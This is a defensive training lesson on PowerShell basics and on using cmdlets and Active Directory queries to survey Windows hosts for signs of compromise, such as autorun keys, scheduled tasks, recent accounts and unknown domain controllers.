PowerShell Objects
PowerShell is an object-oriented scripting language. 

﻿

The fundamental concept in PowerShell scripting is the object. A PowerShell object is essentially a data structure. This data structure may be composed of data only, or it may contain code for execution. Executable PowerShell objects are known as functions, cmdlets, or modules, and are described in greater detail later in the lesson. 

﻿

Data Objects
﻿

Classes
﻿

PowerShell objects are built on common schemas known as classes. These classes form the blueprint for the instantiation of the objects. Classes define an object’s properties, which are strictly typed fields of data, and methods, which are actions that may be performed on an object. If a particular object is intended to be instantiated many times in many different sessions, then creating and exporting a class as its blueprint is the appropriate design choice.

﻿

Custom Objects
﻿

While everything in a default instance of PowerShell is composed of objects, for some scripts or tools, it is useful to create custom data structures to store the data for a limited duration. For this purpose, an analyst may create custom objects to store and manipulate data for the life of the script or the terminal session. There are a number of techniques to accomplish custom object creation, but in all versions of PowerShell since 3.0, the PSCustomObject type definition is available. Creating a custom object with that syntax is shown below.

$newObject = [PSCustomObject]@{

    Property1        = $output.property1
    Property2        = $secondoutput.property2

}
﻿

Hash Tables
﻿

This syntax demonstrating the creation of a custom object is also an example of the hash table, which is a key-value pair data structure in PowerShell that is useful for a number of commands, queries, and on-the-fly object creation. In a hash table, each set of two elements is relationally joined so that one, the key, directly points to the other, the value. A hash table in PowerShell is created with the following syntax, which employs three examples of value data types.

$newHashTable = @{ key1 = $value1; key2 = "value2"; key3 = 3}
﻿

If not added during instantiation, keys and values may be added to the hash table in one of the following ways:

$hashTable = @{}

$hashTable.Foo = 'Bar'

$hashTable['Foo'] = 'Bar'

$hashTable.Add('Foo','Bar')

Executable Objects
﻿

Functions
﻿

Functions are prepared selections of code that make execution more modular. By envisioning what may be executed, a savvy analyst may prepare all the operations to be performed on a particular object, leaving only key variables to be retrieved at runtime. Functions are either declared dynamically in a script or called from installed PowerShell modules.

﻿

Functions that are declared dynamically consist of one or more statements that dictate a function’s operation. They are formed by combining the function keyword, a descriptive function name, and one or more valid PowerShell commands inside a set of script block braces. 

﻿

A very simple example function looks like the following:

function Custom-Function {
	Write-Output "Hello World"
}
﻿

A function may be further defined in more advanced ways by adding one or more of the following statements.

﻿

Param Statement

﻿

Parameters are a way of introducing user-supplied data to the function. Each parameter Is listed under the param statement block with the typecast [Parameter()] and a type definition such as string, int32, or a named PowerShell class like FileObject:

[CmdletBinding()]
	param(
		[Parameter()]
		[string]$Variable
	)
﻿

Unless the definition of the parameter includes the keyword Mandatory with the code [Parameter(Mandatory)], all parameters defined in this block are considered optional.

﻿

When the function is called, parameters are filled by inserting data after a hyphenated parameter name, such as the following:

Custom-Function -Variable "DATA"
﻿

Parameter variables are also sent to the function from the pipeline by adding the ValueFromPipeline attribute to the parameter definition:

[CmdletBinding()]
	param(
		[Parameter(Mandatory, ValueFromPipeline)]
		[string]$Variable
	)
﻿

The command below becomes a valid method of passing data to the function. This is a memory-sensitive way of performing execution on a sequence of objects if that is a concern. 

@("DATA1", "DATA2", "DATA3") | Custom-Function
﻿

NOTE: In the above example, only the last item is acted upon, unless a process statement is included in the function, which is described below.

﻿

Dynamicparam Statement

﻿

Dynamic parameters are complicated but powerful parameters available to a function if specific conditions are met. These parameter definitions are useful in certain cases where the function is used on a specific provider drive (such as the Registry) or only when a different optional parameter is used, or when another parameter has a specific value, all cases of which are not known until runtime. 

﻿

The syntax for the dynamicparam statement is below.

dynamicparam {
	If (condition) {
		Code
	}
}
﻿

Begin Statement

﻿

If a function is expected to iterate over multiple objects from a pipeline, there may be some one-time setup operations necessary to begin processing data. In this case, the begin statement defines a block of code performing those operations. If the begin or end statement is used, all three code-based statements (begin, process, and end) must be defined, even if they are empty.

﻿

The syntax is simply the begin keyword before a script block wrapped in braces.

	begin {
		Code
	}
﻿

Process Statement

﻿

The process statement defines which activity of the function is performed on every object received through a pipeline. If no pipeline data is ever received, then this statement is unnecessary. However, if that is a valid use case, then it is used to delineate iterative tasks from setup and cleanup tasks. When referring to the current object in the pipeline, the syntax $_ or $PSItem is used.

﻿

The syntax is simply the process keyword before a script block wrapped in braces.

	process {
		Code -object $_
	}
﻿

End Statement

﻿

If a function is expected to iterate over multiple objects from a pipeline, there may be some one-time cleanup operations at the end of the process. In this case, the end statement defines a block of code performing those operations. If the begin or end statement is used, all three code-based statements (begin, process, and end) must be defined, even if they are empty.

﻿

The syntax is simply the end keyword before a script block wrapped in braces.

	end {
		Code
	}
﻿

Cmdlets
﻿

Cmdlets are a subset of functions in that they are named executable objects, but the key distinction from functions declared from scripts or in a session is that cmdlets come built into the PowerShell framework by default and are written in a different language, such as C#, rather than in PowerShell itself. 

﻿

To list all possible cmdlets in a system, the cmdlet Get-Command is extremely helpful. 

Get-Command -Type Cmdlet
﻿

﻿

Figure 11.1-1

﻿

Modules
﻿

PowerShell module files are denoted with the .psm1 file extension and are loaded into a PowerShell session in the working directory in which the module file is located by using the following command: 

Import-Module <Module-Name>
﻿

In a host analyst’s line of work, it is common to become familiar with and rely on the developments of others who have solved the same problems faced by Windows systems defenders and written modules that contain many functionalities useful for a defender, such as the modules DeepBlueCLI (a Windows Event parsing framework), PowerForensics (a hard drive forensics framework), or Kansa (an incident response framework).

﻿

Properties
﻿

Properties are attributes of a particular PowerShell object. In accordance with the object’s class definition, these properties point to and label data that is relevant to the object. For example, in a PowerShell file object, its properties include the name, size, location, and modification timestamp of the file. Much of this data is actually ported directly from the Windows kernel file object, which is a logical interface to the data on disk. Because the PowerShell framework is written in compatibility with the same framework that forms much of the Windows OS, this access to Windows objects and their translation to PowerShell objects through the underlying framework is common.

﻿

For a given PowerShell object, the various properties, subordinate objects, and methods that may be executed on that object are obtained with the cmdlet Get-Member.

﻿

For example, executing the Get-Member cmdlet on any directory object, such as a user’s Documents folder, returns the following output.

PS C:\Users\trainee> Get-Item ".\Documents\" | Get-Member
﻿

﻿

Figure 11.1-2

﻿

One of the first things to notice is that Get-Member returns the type name of the object, which reveals the class the object is a member of. A number of methods are also returned here, which are pieces of code related to that class and may be executed on objects of that type. 

﻿

Alias
﻿

It is important to note that many PowerShell cmdlets have an alias that may be used to invoke that cmdlet from a terminal session or even within a script. There is a danger in relying on an alias for invoking a cmdlet, however. There is no guarantee that the environment in which the alias is invoked contains that alias or that it points to the intended cmdlet, even if that alias is normally available by default.

﻿

The list of aliases available in a given PowerShell terminal session is retrieved with the command Get-Alias, which is itself aliased with the characters gal.

﻿

﻿

Figure 11.1-3

﻿

Pipelines
﻿

Pipelines ("|") provide the ability to send output from one command into another for further processing. Examples of commands used with pipelines are Get-Member, Format-List, and Select-String. Figure 11.1-4 provides an example of using Select-String with the Get-Content cmdlet to filter the results.

﻿

﻿

PowerShell Data Gathering Cmdlets
In PowerShell scripts and commands, the following cmdlets are useful for gathering data about particular Windows components or systems. A combination can create a comprehensive picture of a Windows system state.

﻿

Get-Item
﻿

This cmdlet returns the object or list of objects from the specified location. This is used to retrieve a directory, a list of files in a directory, a property of an object, a registry key, or any other object that may be specified by a location in a PowerShell drive.

﻿

Get-Item is used to retrieve a registry key and its subkeys using the following syntax:

Get-Item HKLM:\Software\Microsoft\Powershell\1\Shellids\Microsoft.Powershell\
![image](https://github.com/user-attachments/assets/7625bea0-cda5-497b-a8e6-72397bd64b0f)

Some registry keys of note include the AutoRun keys, which are often used by malicious actors to gain persistence to a machine with each reboot or log in. Those keys are listed below.
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ RunServices
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ RunServicesOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ RunOnce\Setup

Get-Item is also used to retrieve the items in a directory using the following syntax. The wildcard character * specifies all items. 
Get-Item -Path "C:\*"

![image](https://github.com/user-attachments/assets/06f66670-bd6b-412a-b66a-cadba7bb5a19)

Get-ItemProperty


This cmdlet is used to return all the properties of an item. On file objects, this cmdlet operates similarly to Get-Item, but on registry objects, the difference is that while Get-Item returns the key and any subkeys, Get-ItemProperty returns the values of the key.
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\

![image](https://github.com/user-attachments/assets/1979f3c3-bcce-4478-983b-611ef8dd9985)

![image](https://github.com/user-attachments/assets/3a4c4361-5a63-4e5c-9095-daec85edbe08)


Get-ChildItem


This cmdlet is similar to the Windows command-line command dir, in that it retrieves a directory listing if the object of the command is a file system directory object. It is also used to retrieve all the registry values if the object of the command is a registry key.


This is used to retrieve all the items in a specified directory using the following syntax:

Get-ChildItem -Path "C:\"

![image](https://github.com/user-attachments/assets/ede4ffd7-fdbe-4d9f-8285-d2c776618d0a)



When a complete directory listing including not only child items but all subfolders, their children, and further descendant objects is required, Get-ChildItem is called with the -Recurse parameter switch. Setting the -Recurse parameter instructs the cmdlet to perform subdirectory recursion. 


In some cases, an analyst only wants to retrieve certain types of files or filenames. In this use case, the -Include parameter is used to only return entries matching a specific pattern. For example, to only find executable files in the Program Files directory and subdirectories, the following command is used:

PS C:\Program Files> Get-ChildItem -Recurse -Include *.exe


![image](https://github.com/user-attachments/assets/61714965-26fa-469d-9d30-0b399d387d2f)


Get-Content


This cmdlet is used to retrieve the data in a file as an array of strings. If this data is in American Standard Code for Information Interchange (ASCII) characters, then the output prints cleanly to the terminal. If not, the output causes garbage data to print to the screen. For reading non-ASCII binary data from a file, it is more useful to employ PowerShell’s underlying .NET framework by calling the following function:

[System.IO.File]::ReadAllBytes.



To read the ASCII content of a file, use the following syntax:
Get-Content -Path "C:\path\to\file"



Notably, since it is common in some Windows malware to hide data, such as executable scripts, inside Alternate Data Streams (ADS), the Get-Content cmdlet is used to read those streams with the syntax:
Get-Content -Path "C:\path\to\file" -Stream MaliciousStreamName



The names of the alternative streams are not intuitive. They need to be identified by printing the properties of file items to find anomalous data streams.


Get-Process


This cmdlet is used to retrieve a list of all running process objects. Its output is similar to the output of the tasklist command in the Windows command line. The alias for this cmdlet is gps.

Get-Process

![image](https://github.com/user-attachments/assets/67964367-8969-4b98-9f25-dd19df6ed978)

To expand all the properties each process object contains, pipe the output of a single object, such as the explorer process, into a formatted list (described later in this lesson):
Get-Process -ProcessName "explorer" | Format-List *

![image](https://github.com/user-attachments/assets/f2e1b4ef-27f2-4c01-be5a-2569d670371e)

Get-CimInstance 


This cmdlet is the updated version of the deprecated cmdlet Get-WMIObject and returns objects queried from a Common Information Model (CIM) server on the device. 


This cmdlet is used for the following purposes: 
Find installed software by querying for members of the Win32_Product class. Other methods of finding installed software include enumerating children of the HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall registry key and folders in the Program Files and Program Files (x86) directories.
List running processes by querying for members of the Win32_Process class.
Retrieve metadata for a system by returning the values of the Win32_ComputerSytem class. The properties of this object include model, manufacturer, name, hostname, domain, and administrator password status. 

The syntax for this command is:
Get-CimInstance -ClassName <Win32_Class>

Or
![image](https://github.com/user-attachments/assets/8cfb3712-da42-45a4-9a1e-066fe6c0705c)


Or 
Get-CimInstance -ClassName <win32_class> -Filter @{"property"=VALUE} -Property Name



Get-Service


This cmdlet returns a list of object details for all services installed on the local machine. This includes not only running services but also stopped and suspended services. 
Get-Service

![image](https://github.com/user-attachments/assets/4b0ef38a-b3ef-4c81-a93b-e3d0ac753fec)



As with the process list, to expand the properties of a single service object, pipe one specified by name to a formatted table:

Get-Service -DisplayName "DNS Client" | Format-List *

![image](https://github.com/user-attachments/assets/9740ecaa-2438-49ac-9064-9904c0e6a5d8)

Get-NetTCPConnection


This cmdlet finds and returns all active TCP connection objects. Each object includes properties such as local and remote address, local and remote port, and the connections' state. This cmdlet is useful for determining which ports are opened and comparing that list to the expected network state. This is a useful technique for identifying suspicious processes which are listening or connecting out to malicious addresses.

Get-NetTCPConnection

![image](https://github.com/user-attachments/assets/7b884c95-b695-4352-8706-38049887a601)

To see which properties each NetTCPConnection object contains, run the following command:
Get-NetTCPConnection -LocalPort 139 | Format-List *

![image](https://github.com/user-attachments/assets/29f480ff-8ccc-48ef-a068-72aea0f4674c)

As seen in Figure 11.1-15, if a particular connection is suspicious, details such as CreationTime and OwningProcess are useful in further investigation of the host activity related to the network activity that raised a red flag.


Get-ScheduledTask

![image](https://github.com/user-attachments/assets/3e51eb1a-6472-42eb-8898-02b2e064e084)


This cmdlet is used to retrieve a list of all scheduled tasks in the system. These are often a vector for adversary persistence or may be disabled by adversaries when the task runs scripts or programs to search for malicious activity. 

Get-ScheduledTask 

![image](https://github.com/user-attachments/assets/7968786b-12c9-4543-a4b6-4e014482bf27)

Get-ScheduledTask -TaskName Proxy | Format-List *

![image](https://github.com/user-attachments/assets/fac0299e-f4ed-407b-9144-d9c99151e32b)

In this data structure, the Triggers and Actions properties are PowerShell objects with more detail about which action is executed and when. During investigations in which scheduled tasks are Indicators of Compromise (IOC), expanding and scrutinizing these structures is warranted.

PowerShell Data Manipulation Cmdlets
After retrieving an initial set of objects and output from a cmdlet, additional processing and formatting are often required to limit the results to the data and presentation necessary for human parsing for further analysis. The following cmdlets are used for these purposes.

﻿

Select-Object
﻿

This cmdlet is useful for selecting a subset of a cmdlet's output. This can be either a subset of the objects themselves or a subset of the properties of all objects piped to this cmdlet.

﻿

This cmdlet is called with the select alias. 

﻿

The syntax for employing this cmdlet follows the format:

Cmdlet | Select-Object PropertyName1, PropertyName2



To select the Name, Process ID, and Description of all active processes, the syntax is as follows:
Get-Process | Select-Object Name, ID, Description



PowerShell Data Manipulation Cmdlets
After retrieving an initial set of objects and output from a cmdlet, additional processing and formatting are often required to limit the results to the data and presentation necessary for human parsing for further analysis. The following cmdlets are used for these purposes.

﻿

Select-Object
﻿

This cmdlet is useful for selecting a subset of a cmdlet's output. This can be either a subset of the objects themselves or a subset of the properties of all objects piped to this cmdlet.

﻿

This cmdlet is called with the select alias. 

﻿

The syntax for employing this cmdlet follows the format:

Cmdlet | Select-Object PropertyName1, PropertyName2
﻿

To select the Name, Process ID, and Description of all active processes, the syntax is as follows:

Get-Process | Select-Object Name, ID, Description

![image](https://github.com/user-attachments/assets/75a450d3-ba40-4ff8-8c87-d6c42393050a)

Another powerful function of Select-Object is to expand PowerShell objects that are the values of a parent object's properties. For example, all Dynamic-Linked Libraries (DLL) loaded by an active process are listed in a collection object, which is stored in the process object property Modules. By using the -ExpandProperty parameter with Select-Object, it is possible to view those loaded libraries. 

Get-Process | Where-Object Name -eq explorer | Select-Object -ExpandProperty Modules


![image](https://github.com/user-attachments/assets/82d7c109-4496-4275-9d5f-5828c45085cd)


Where-Object


This cmdlet is used to select a subset of objects by applying a condition or filter to one or more of an object's properties. A user applies either a straightforward conditional comparison or a more complex FilterString script block with containment, matching, or equality operators.


Containment Operators


These operators are used to filter for objects in a collection that do or do not contain a specific property or a specific value for a property. 
-contains: Filters a collection containing a property value.
-notcontains: Filters a collection that does not contain a property value.
-in: Value is in a collection; returns property value if a match is found.
-notin: Value is not in a collection; null/$false if there is no property value.

Matching Operators


These operators are similar to containment operators, but specifically for strings.
-like: String matches a wildcard pattern (e.g., "foofoo" -like "*foo*" is True; "foofoo" -like "foo" is False). 
-notlike: String does not match a wildcard pattern.
-match: String matches regular expression pattern (e.g., "foofoo" -match "foo" is True). 
-notmatch: String does not match regular expression pattern.

Equality Operators


These operators are most ideal for numerical values, but equality may be assessed between any two objects of the same type.
-eq: Value equal to the specified value.
-ne: Value not equal to the specified value.
-gt: Value greater than the specified value.
-ge: Value greater than or equal to the specified value.
-lt: Value less than the specified value.
-le: Value less than or equal to the specified value.

FilterScript Format


Any of the above operators may be combined in more complex statements in a FilterScript block utilizing the following syntax:
{($_.property1 -operator value1) AND (($_.property2 -operator value2) OR ($_.property3 -operator value3))}



An example statement that filters all active processes with host in the process name and consuming less than 5 Central Processing Unit (CPU) units and more than 0.01 CPU units, reads as follows:

Get-Process | Where-Object {($_.ProcessName -like "*host*") -and ($_.CPU -lt 5) -and ($_.CPU -gt 0.01)}

![image](https://github.com/user-attachments/assets/0512a3f5-7a9d-453c-9fbf-4416410c4687)


Select-String


This cmdlet is used to find string patterns in data. The use cases include finding sensitive data in text files, parsing out suspicious entries in Windows logs, or identifying files with malicious IOCs in file listings. 


The syntax of this cmdlet when used in a standalone fashion to parse a file is:
Select-String -Path "C:\path\to\file" -Pattern "pattern"



When data is piped to the cmdlet, the syntax takes the following format:
<Data-Object> | Select-String -Pattern "pattern" 



Or when the message to be parsed is in a property of the object, the syntax is as follows:
<Data-Object> | Select-String -InputObject ($_.Property) -Pattern "pattern"



Format-List


By default, PowerShell displays the output of a command as a shortened table of object data. Format-List is an alternative to the default that displays selected properties of the output objects in a list where the properties are each printed on their own line. The alias for this cmdlet is fl. If a user wants to display all properties of an object rather than individually naming a subset, the wildcard character * is used to indicate all properties. 


The syntax for displaying data with this cmdlet uses the following format:

<Data> | Format-List -Property Property1, Property2



An example of formatting the properties of the explorer process in a list looks like the following:

Get-Process | Where-Object -Property Name -match "explorer" | Format-List Name, Description, Path, ID

![image](https://github.com/user-attachments/assets/0c9804db-76ac-459c-a733-bce4fefc4ea5)

Format-Table


Alternatively, the table format may be maintained, but if the properties displayed need to be changed, Format-Table is employed with similar syntax and parameters. Its alias is ft.


This cmdlet may also take the parameter -Autosize to minimize truncation of the columns or -Wrap to wrap off-screen columns to a new line, though the latter option may leave data garbled on screen. 


The syntax for this cmdlet uses the following format:
<data> | Format-Table -Property Property1, Property2



An example of formatting the properties of the explorer process in a table looks like the following:
Get-Process | Where-Object -Property Name -match "explorer" | Format-Table Name, Description, Path, ID

![image](https://github.com/user-attachments/assets/1d011cf0-ad6a-4d3c-97be-0287bd68d5dc)


Sort-Object


This cmdlet is used to sort a collection of objects based on a particular property's value. This may be useful for sorting events by most recent, files by size, or processes by memory usage. 


The important parameters for this cmdlet are -Property, -Ascending, -Descending, and -Unique.


An example of sorting processes by memory usage looks like the following:
Get-Process | Sort-Object -Property WS -Descending

![image](https://github.com/user-attachments/assets/16cd19fa-b3ad-44e1-acd3-a5b978b7fbde)

Foreach-Object


When performing in-line processing of each object in a collection, the Foreach-Object cmdlet is used to iterate over each object and perform the transformation on it. The alias for this cmdlet is foreach when data is piped to it. However, when used at the beginning of a PowerShell statement, foreach is instead a keyword initializing a loop. Functionally, both methods of iteration achieve the same results when acting on the same object. The distinguishing design consideration is that the Foreach-Object cmdlet expects data to be streamed to it over a pipeline, which maximizes memory conservation at the cost of performance, while the foreach statement loads an entire collection of objects into memory prior to an operation, which maximizes performance at the cost of higher memory usage.


Like functions constructed to handle a series of data objects from a pipeline, Foreach-Object is designed to perform beginning and ending operations around the processing of a collection if the user desires. A script block supplied to the cmdlet without a label is executed on every object, but if a distinction is necessary, separate script blocks may be designated with the -Begin, -Process, and -End parameters.


When data is streamed to the cmdlet, the syntax is as follows:
<Data-Object> | Foreach-Object -Begin {commands} -Process {command1; command2} -End {commands}



When the foreach keyword is used to initiate a PowerShell loop, the syntax is as follows:
Foreach ($object in $collection) {
	Example-Cmdlet -Input $object
}



As an example, to write a subset of events from a previous command to a particular file, the following command is executed:
$events | ForEach-Object -Begin {Get-Date} -Process {Out-File -FilePath Events.txt -Append -InputObject $_.Message} -End {Get-Date}


Invoke-Command


To supply PowerShell commands for a remote computer to run, the Invoke-Command cmdlet is used for input. Executing this cmdlet successfully requires remote PowerShell administration to be enabled on the target device. 


The syntax for this cmdlet is as follows:
Invoke-Command -ComputerName TEST001 -Credential Domain\User -ScriptBlock {Command1; Command2}



If an active PowerShell session was previously established with the New-PSSession cmdlet, then commands may be run through that session with the syntax:
Invoke-Command -Session $sessionName -ScriptBlock {Command1; Command2}

Write-Output


This cmdlet is used to print text to the terminal. It is useful for returning feedback to the person executing a script or to provide a prompt when input is required during runtime. 

Write-Output "The time and date is $(Get-Date)"
![image](https://github.com/user-attachments/assets/cfdd238a-89df-49d7-a6cd-2bfec79a8022)

Out-File


This cmdlet is used to print the results of a cmdlet or a series of operations to a file on disk. The syntax for this output is as follows:
<Data> | Out-File -Path "C:\path\to\out\file" -Append

PowerShell Common Cmdlet Parameters
The following list of common parameters is set in many PowerShell cmdlets.

﻿

ErrorAction
﻿

This parameter defines the action taken in the event of an error during execution. The most common use case for setting this parameter is to handle denied access errors, such as when the current PowerShell process does not have permission to access a particular file or directory during a survey script. Setting this parameter reduces the on-screen noise caused by the errors when set with its most common value SilentlyContinue. The ErrorAction parameter is set for any cmdlet.

﻿

This parameter is set with one of the following values.

Stop: Ceases all operations, and the error message is displayed.

Continue: Continues to operate, but verbose error messages are displayed to standard output.

SilentlyContinue: Continues to operate, and no error messages are displayed. An error message is added to PowerShell's $Error variable and may be retrieved later.

Ignore: Identical to SilentlyContinue, but no error messages are recorded, even silently.

Inquire: Pauses in operating, displaying an error message, and prompting the user for permission to continue.

The default behavior for any cmdlet in which this parameter is not manually set is defined by the ErrorActionPreference value. On the win-hunt Virtual Machine (VM), that value is Continue.

﻿![image](https://github.com/user-attachments/assets/9e120852-43b3-4c6b-a9f6-10be9ca17a0e)

Force


In some cmdlets, an operation may be executed that cannot be undone, such as the overwriting or deletion of a file object, or restarting a service. In such cases, the normal operation of the cmdlet is to deny or prompt the user for execution. When a user understands the risks of the operation and desires for it to continue regardless, the -Force parameter switch is appended to the cmdlet command line to bypass any confirmation text and proceed to execution.
 
The PowerShell Integrated Scripting Environment
The PowerShell ISE is the editor installed by default in Windows OSs for creating and editing PowerShell scripts. 

﻿

Interface of the ISE
﻿

Toolbar
﻿

The toolbar at the top of the ISE window beneath the File menu contains buttons for many quick operations that are used over the course of script development. These include file management buttons such as New, Open, and Save; editing buttons such as Cut, Copy, Paste, Undo, and Redo; and execution buttons such as Run Script, Run Selection, and Stop Operation. Most buttons also have a corresponding keyboard shortcut, which is viewed by hovering the mouse over the button representing the action. For example, hovering over Run Selection shows that the keyboard shortcut for that operation is F8. 

![image](https://github.com/user-attachments/assets/356e1a91-d768-444d-bfb7-fa2f061a713b)

Script Pane


By selecting New on the toolbar, the Script pane opens for editing.

![image](https://github.com/user-attachments/assets/6825aae1-af1b-40f7-8b0e-ef2fb81c05ed)



In this pane, the body of the script is entered, then saved using the Save button on the toolbar.

Script Tab


When multiple scripts are open simultaneously, the different documents may be navigated through the Script tab.

![image](https://github.com/user-attachments/assets/b79cd76d-fc78-433e-8f5b-3ee91fa30a9b)

Console Pane





The Console pane of the ISE is used for running ad-hoc commands or for triggering the execution of a script for testing purposes. This pane follows all the rules of a normal PowerShell session, so it cannot be assumed that the console automatically begins in the same working directory as the script in production.

![image](https://github.com/user-attachments/assets/669a1111-2931-42ac-bbe4-0567c714336f)

Key Features of the ISE


Automatic Completion


As code is being entered in the ISE, the editor offers potential completions of known cmdlets for the user to select from a drop-down menu below the cursor. If a user selects Enter while a menu item is selected, the text automatically completes and editing may resume from the end of the text. 

![image](https://github.com/user-attachments/assets/e3c4b105-ce07-4572-a724-3f94b44282e2)



Selective Execution


If the functionality for an individual selection of code needs to be tested, a user may run only those commands in the provided console window by selecting the code and F8. 
![image](https://github.com/user-attachments/assets/bf1d1762-4199-485b-82e9-f09d66465569)

Context-Sensitive Help


In the ISE, the help information for a particular cmdlet or language feature may be brought up by selecting F1 when that element is highlighted. The ISE understands that the context for the requested help is the selected element. 


A corresponding Get-Help <element> -ShowWindow command executes on the user’s behalf in the console window.

![image](https://github.com/user-attachments/assets/3ea719e9-3c1c-4c77-bf31-58f23ac14507)



########CDAH-M11L2-Querying Active Directory with PowerShell#############


Active Directory Cmdlets for System Exploration
Analysts can access AD information through PowerShell cmdlets. The cmdlets query AD to retrieve and display AD objects from the module ActiveDirectory. This section introduces both high-level and low-level cmdlets to use with AD. High-level cmdlets provide a more macro view of the system, while low-level cmdlets provide access to more specific components. Together, they provide a comprehensive view of a system, which is especially useful when analysts initially have little or no information. Using these cmdlets from high-level to low-level allows analysts to explore a system with a "top-down" approach that provides greater detail at each level. 

﻿

Filters and Syntax
﻿

Many of the cmdlets in this lesson are commonly paired with the parameter 

-Filter to improve searching efficiency. Rather than extracting all information and then searching through it, filtering parameters extract and display only the most relevant results.

﻿

Filters may follow the Where-Object syntax, but enclose the filter string in double quotes rather than braces. As an example, the following filter outputs accounts that contain the name "Joe" and are also not trusted for delegation:

-Filter "(Name -like '*joe*') -and (TrustedForDelegation -eq 'False')"

AD Cmdlets for High-Level Objects
PowerShell high-level cmdlets include the following:

Get-ADDomain
Get-ADForest
Get-ADGroup
Get-ADGroupMember
Get-ADOrganizationalUnit
﻿

Get-ADDomain﻿
﻿

The cmdlet Get-ADDomain returns an AD domain object. A domain object is the common point of association between all subordinate objects such as users, computers, and groups associated with the domain.

﻿

Get-ADForest﻿
﻿

The cmdlet Get-ADForest returns the AD forest object, which is useful in environments with multiple domains in a single forest. 

﻿

Get-ADOrganizationalUnit﻿
﻿

The cmdlet Get-ADOrganizationalUnit returns any subcategories of AD objects within the domain, which are called Organizational Units (OU). This cmdlet may be combined with other cmdlets to create more complex queries. 

﻿

Get-ADGroup﻿
﻿

The cmdlet Get-ADGroup returns AD group objects. This primarily serves to determine group membership. Groups that allow higher privileges over some or all domain resources to their members must be closely monitored. For these types of groups, including users that do not strictly require higher privileges constitutes a significant security risk. 

﻿

Get-ADGroupMember﻿
﻿

The cmdlet Get-ADGroupMember returns a collection of AD user objects that are associated with a particular AD group. The group name is designated by the field Identity, which is required to execute this cmdlet. 

﻿

The next task provides an opportunity to test each of these cmdlets in a lab. 

Test High-Level AD Cmdlets


Continue using the VM win-hunt to work in the interactive session from the last lab. Test out the AD cmdlets introduced so far.


Workflow


1. Display the AD Forest object by calling the cmdlet without parameters, as follows:
Get-ADForest



2. Display the AD Domain object by calling the cmdlet without parameters, as follows:
Get-ADDomain



3. List all the OUs in the domain by entering the following query:
Get-ADOrganizationalUnit -Filter *



4. List all of the AD Group objects in the domain by entering the following query:
Get-ADGroup -Filter *



5. Display all properties of the AD Group object Administrators by entering the following command:
Get-ADGroup -Identity Administrators -Properties *



One field in this structure is members and their Lightweight Directory Access Protocol (LDAP) syntax. The cmdlet Get-ADGroupMember also provides this information, but with more direct access.


6. List all members of the Administrators group by entering the following command:
Get-ADGroupMember -Identity Administrators


PowerShell low-level cmdlets include the following:
Get-ADUser
Get-ADComputer
Get-ADDomainController

Each cmdlet offers a variety of query options for analysts to use, as needed. The most common use cases can be applied to daily analyst operations. For example, analysts can apply AD queries on low-level objects to achieve the following:
Identify recently created accounts
List all domain-joined computers
List all domain controllers in a forest

Get-ADUser


The cmdlet Get-ADUser retrieves the AD user objects for a domain. Analysts may use this cmdlet to thoroughly inventory user accounts, especially privileged accounts, and conduct least privilege assessments. This helps prevent successful social engineering attacks that target these accounts towards achieving network compromise.


Identify Recently Created Accounts


One of the common use cases for the cmdlet Get-ADUser is to find accounts that are recently created, and compare this list to known users of a system. It is common for malicious threat actors to create user accounts for persistence, especially if they are able to create privileged accounts.


The property whenCreated displays all accounts in a list, sorted by the date of creation. This property is not part of the default display that the cmdlet produces, which is why it needs to be explicitly included in a command, as in the following example:


Get-ADUser -Filter * -Properties whenCreated | Sort-Object -Property whenCreated | FT Name, SamAccountName, whenCreated -AutoSize

Get-ADComputer


The cmdlet Get-ADComputer retrieves all AD computer objects from the domain. This is useful for compiling a list of devices and determining the operating system, Internet Protocol (IP) address, and other helpful information about each device.

Using the Get-ADComputer cmdlet, the following query retrieves information about all computers in AD, including their IPv4 addresses, operating systems, and operating system service packs:


Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, OperatingSystemServicePack



This type of query helps analysts uncover whether an attacker has surreptitiously added a device to the physical footprint and joined it to the domain. The analyst just needs to compare the output from the query to an official assets inventory.


List All Domain-Joined Computers


Listing all domain-joined computers with each of their addresses and operating systems helps develop a logical inventory of the mission partner infrastructure. Comparing this information to official records helps identify any inconsistencies or changes. Network defenders must understand their own terrain if they are to effectively defend it.


Get-ADDomainController


The cmdlet Get-ADDomainController is used to return all AD computer objects that are DCs. Calling this command without any other parameters returns the primary DC. 


List All Domain Controllers in a Forest


The highest value targets available to a malicious threat actor are the DC machine account and the Administrator account privileges necessary to configure the domain. This makes it vital for analysts to identify each domain controller in an environment and scrutinize the logging practices on all devices listed. Analysts must also routinely check the list of domain controllers to ensure that unknown devices are not configured as domain controllers and that asset inventories are accurate for future reference.


Additional Tools


Two additional PowerShell cmdlets are available to help analysts explore systems through AD:
Search-ADAccount
Get-GPOReport



Search-ADAccount


The cmdlet Search-ADAccount identifies accounts that meet a particular criterion, usually related to account or password status. One use case for employing this cmdlet is to find accounts that may be the target of brute force or social engineering attacks. For example, an account with an expired password may be the subject of a phishing attack to steal credentials.


Notable flags to search for include the following:
ExpiredPassword
AccountDisabled
AccountExpiring
AccountInactive
LockedOut



The results of a Search-ADAccount query may also be filtered with the parameters UsersOnly or ComputersOnly. An example of this cmdlet is available in an upcoming section.


Find Locked Out Accounts


The AD lockout policy is tied to repeated failed login attempts on a single account, within a set period of time. The repeated failures may indicate a brute force attack or they may just be the result of entering the wrong credentials accidentally. Performing an AD query with Search-ADAccount to find locked out accounts may reveal any ongoing initial access attempts by malicious threat actors.


Get-GPOReport


The cmdlet Get-GPOReport returns the metadata and content of any or all Group Policy Objects on a machine. As these policies are managed by the DC in an AD environment, this report provides an important understanding of the common device configurations in the network. This is helpful for determining what vulnerabilities and misconfigurations may be present.


